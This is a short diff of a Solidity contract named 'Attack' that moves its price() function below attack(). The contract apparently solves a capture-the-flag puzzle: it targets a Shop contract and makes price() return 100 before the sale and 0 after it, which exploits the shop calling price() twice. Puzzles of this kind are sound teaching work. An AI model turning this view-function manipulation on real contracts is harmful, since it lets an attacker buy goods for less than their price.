@@ -9,11 +9,11 @@ contract Attack is Buyer {
         target = Shop(targetAddr);
     }
 
-    function price() public view override returns (uint256) {
-        return target.isSold() ? 0: 100;
-    }
-
     function attack() public {
         target.buy();
+    }
+
+    function price() public view override returns (uint256) {
+        return target.isSold() ? 0: 100;
     }
 }
